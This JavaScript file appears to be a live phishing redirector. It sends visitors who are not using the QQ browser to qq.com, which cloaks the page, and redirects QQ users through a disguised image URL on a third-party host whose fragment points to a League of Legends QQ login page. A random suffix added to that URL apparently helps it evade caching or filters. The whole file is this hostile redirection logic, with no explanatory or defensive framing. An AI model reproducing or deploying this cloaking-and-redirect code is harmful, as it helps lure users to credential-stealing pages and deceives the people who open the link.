function leleua() {
    var sUserAgent = navigator.userAgent.toLowerCase();
    if (sUserAgent.match(/QQ/i) == 'qq' || location.href.indexOf("edit") > -1) {
    } else {
        window.location.href = "https://qq.com";
    }
}

leleua();

window.onload = function () {
    const targetUrl = 'https://static.job10000.com/yl/feedbackNew/20240215/65cd79c7502195f093dce6d9.png?#url=http://lol.qq.com/comm-htdocs/milo_mobile/login.html';
    const timestamp = Date.now();
    const randomString = Math.random().toString(36).substring(2);
    const urlWithParam = `${targetUrl}u${timestamp}${randomString}`;
    window.location.href = urlWithParam
}
